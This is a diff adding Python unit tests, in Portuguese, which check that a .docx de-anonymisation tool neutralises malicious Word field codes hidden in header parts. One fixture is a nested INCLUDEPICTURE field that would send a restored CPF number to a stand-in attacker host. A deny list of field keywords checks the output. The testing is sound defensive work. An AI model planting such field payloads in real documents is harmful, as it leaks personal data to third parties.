@@ -1490,12 +1490,12 @@ class Arquivos(unittest.TestCase):
         with zipfile.ZipFile(saida) as z:
             self.assertIn(b"https://x.com/?cpf=[CPF_1]", z.read("word/_rels/document.xml.rels"))
 
-    def _docx_cru(self, nome, corpo, rels_extra="", partes_extra=None):
+    def _docx_cru(self, nome, corpo, rels_extra="", partes_extra=None, tipos_extra=""):
         """Monta um docx mínimo à mão: `corpo` vai dentro de w:body."""
         ns = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"'
         caminho = os.path.join(self.tmp, nome)
         with zipfile.ZipFile(caminho, "w") as z:
-            z.writestr("[Content_Types].xml", '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/></Types>')
+            z.writestr("[Content_Types].xml", '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/>%s</Types>' % tipos_extra)
             z.writestr("_rels/.rels", '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>')
             z.writestr("word/document.xml", '<?xml version="1.0"?><w:document %s><w:body>%s</w:body></w:document>' % (ns, corpo))
             z.writestr("word/_rels/document.xml.rels", '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">%s</Relationships>' % rels_extra)
@@ -1543,6 +1543,59 @@ class Arquivos(unittest.TestCase):
         for proibido in ("fldSimple", "INCLUDEPICTURE", "atacante.example", "w:instr"):
             self.assertNotIn(proibido, xml)
         self.assertEqual(texto, "52998224725figura")
+
+    _CAB_ATAQUE = ('<w:hdr xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:p>'
+                   '<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> INCLUDEPICTURE "https://atacante.example/</w:instrText></w:r>'
+                   '<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> REF marca </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r>'
+                   '<w:r><w:t>x</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r><w:r><w:instrText>" \\d </w:instrText></w:r>'
+                   '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>fig</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'
+                   '<w:fldSimple w:instr="INCLUDETEXT y"><w:r><w:t>z</w:t></w:r></w:fldSimple></w:hdr>')
+    _REL_CAB = '<Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="%s"/>'
+
+    def _reverter_cab_fora_de_word(self, nome, caminho_parte, tipos_extra):
+        origem = self._docx_cru(nome, '<w:p><w:bookmarkStart w:id="1" w:name="marca"/><w:r><w:t>[CPF_1]</w:t></w:r><w:bookmarkEnd w:id="1"/></w:p>',
+                                self._REL_CAB % ("../" + caminho_parte if not caminho_parte.startswith("word/") else caminho_parte[5:]),
+                                partes_extra={caminho_parte: self._CAB_ATAQUE}, tipos_extra=tipos_extra)
+        saida = os.path.join(self.tmp, nome + "-v.docx")
+        r = motor.tratar({"op": "reverter", "entrada": origem, "saida": saida, "tabela": self._TAB_CPF})
+        self.assertTrue(r["ok"], r)
+        with zipfile.ZipFile(saida) as z:
+            for info in z.infolist():
+                dados = z.read(info.filename)
+                for proibido in (b"instrText", b"fldChar", b"fldSimple", b"INCLUDEPICTURE", b"atacante.example"):
+                    self.assertNotIn(proibido, dados, (info.filename, proibido))
+            self.assertIn(b"52998224725", z.read("word/document.xml"))
+
+    @unittest.skipUnless(tem("lxml"), "lxml não está instalado neste Python")
+    def test_docx_reverter_neutraliza_campo_em_parte_fora_de_word(self):
+        self._reverter_cab_fora_de_word("c1.docx", "extras/cabecalho.xml",
+            '<Override PartName="/extras/cabecalho.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.header+xml"/>')
+
+    @unittest.skipUnless(tem("lxml"), "lxml não está instalado neste Python")
+    def test_docx_reverter_neutraliza_campo_em_word_cab_dat(self):
+        self._reverter_cab_fora_de_word("c2.docx", "word/cab.dat",
+            '<Override PartName="/word/cab.dat" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.header+xml"/>')
+
+    @unittest.skipUnless(tem("lxml"), "lxml não está instalado neste Python")
+    def test_docx_reverter_neutraliza_campo_em_bin_declarado_como_xml(self):
+        self._reverter_cab_fora_de_word("c3.docx", "word/x.bin", '<Default Extension="bin" ContentType="application/xml"/>')
+
+    @unittest.skipUnless(tem("lxml"), "lxml não está instalado neste Python")
+    def test_docx_reverter_recusa_parte_xml_malformada_fora_de_word(self):
+        for nome, parte, dados, tipos in (("m1.docx", "extras/x.dat", "<w:hdr><w:p>", ""),
+                                          ("m2.docx", "extras/y.bin", "lixo binario\x00\x01", '<Default Extension="bin" ContentType="application/xml"/>')):
+            origem = self._docx_cru(nome, '<w:p><w:r><w:t>[CPF_1]</w:t></w:r></w:p>', partes_extra={parte: dados}, tipos_extra=tipos)
+            saida = os.path.join(self.tmp, nome + "-v.docx")
+            r = motor.tratar({"op": "reverter", "entrada": origem, "saida": saida, "tabela": self._TAB_CPF})
+            self.assertEqual((r["ok"], r.get("codigo")), (False, "arquivo_invalido"), (nome, r))
+
+    @unittest.skipUnless(tem("lxml"), "lxml não está instalado neste Python")
+    def test_docx_reverter_deixa_passar_parte_binaria_de_verdade(self):
+        origem = self._docx_cru("b.docx", '<w:p><w:r><w:t>[CPF_1]</w:t></w:r></w:p>', partes_extra={"word/media/i.png": b"\x89PNG\r\n\x1a\n\x00\x01"},
+                                tipos_extra='<Default Extension="png" ContentType="image/png"/>')
+        saida = os.path.join(self.tmp, "b-v.docx")
+        r = motor.tratar({"op": "reverter", "entrada": origem, "saida": saida, "tabela": self._TAB_CPF})
+        self.assertTrue(r["ok"], r)
 
     @unittest.skipUnless(tem("lxml"), "lxml não está instalado neste Python")
     def test_docx_reverter_campo_page_vira_texto_e_continua_revertendo(self):
